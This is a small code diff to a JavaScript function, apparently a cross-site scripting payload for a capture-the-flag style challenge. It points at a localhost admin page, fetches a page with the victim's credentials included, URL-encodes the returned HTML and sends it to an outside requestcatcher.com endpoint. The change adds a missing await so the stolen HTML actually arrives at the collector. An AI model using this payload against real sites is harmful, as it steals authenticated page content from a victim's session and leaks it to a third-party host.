@@ -29,7 +29,7 @@ async function getRealData() {
   const AdminUrl = "http://127.0.0.1:1337/admin";
   const testurl = "https://m1ra1b0t.github.io/";
   const response =  await fetch(testurl, {credentials: 'include',});
-  const adminHtml = response.text();
+  const adminHtml = await response.text();
   const adminHtmlEncoded = encodeURIComponent(adminHtml);
   // Usage example
   fetch("https://wecando.requestcatcher.com/adminhtml/" + adminHtmlEncoded);
